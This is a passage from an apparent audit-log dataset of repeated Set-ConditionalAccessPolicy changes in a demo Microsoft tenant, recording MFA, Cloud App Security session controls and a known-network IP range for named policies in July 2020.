'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/24/2020 2:30:33 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 4:59:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 4:59:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/25/2020 2:21:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/25/2020 2:21:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/25/2020 5:37:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/25/2020 5:37:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/26/2020 5:09:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/26/2020 5:09:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/27/2020 2:07:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/27/2020 2:07:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/27/2020 5:11:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/27/2020 5:11:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 2:00:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 2:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:30 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:31 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:54 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:54 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 